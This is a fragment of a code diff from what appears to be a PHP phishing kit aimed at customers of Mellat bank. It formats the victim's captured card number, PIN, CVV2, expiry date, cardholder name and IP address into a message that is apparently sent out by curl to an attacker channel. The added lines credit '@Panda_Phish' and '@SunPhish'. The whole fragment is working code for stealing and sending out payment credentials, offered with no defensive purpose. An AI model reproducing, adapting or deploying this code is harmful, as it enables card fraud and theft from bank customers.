@@ -61,12 +61,10 @@ $ch = curl_init();
 $Text = "✅ Transaction finished!
 -------------- BANK --------------
 🏦 Name : $bankinfo[1]
--------------- CARD --------------
 💳 Card : <code>$pan1 $pan2 $pan3 $pan4</code>
 🔐 Paas : <code>$pin</code>
 📋 Cvv2 : <code>$cvv</code>
 📆 Date : <code>$year</code> Month: <code>$month</code>
--------------- INFO --------------
 👤 Card Holder : <code>$holderName</code>
 💴 Amount : $amount 𝗥𝗶𝗮𝗹𝘀
 📍 IP : <code>$ip</code>
@@ -74,7 +72,10 @@ $Text = "✅ Transaction finished!
 📝 ToDay : $roz
 📌 Date : $tarikh
 ✨ Portal : Mellat
--------------- $bankinfo[1] --------------";
+-------------- $bankinfo[1] --------------
+Channel : @Panda_Phish
+Code By : @SunPhish
+";
     
 $Text .="$bankinfo[0]";
 
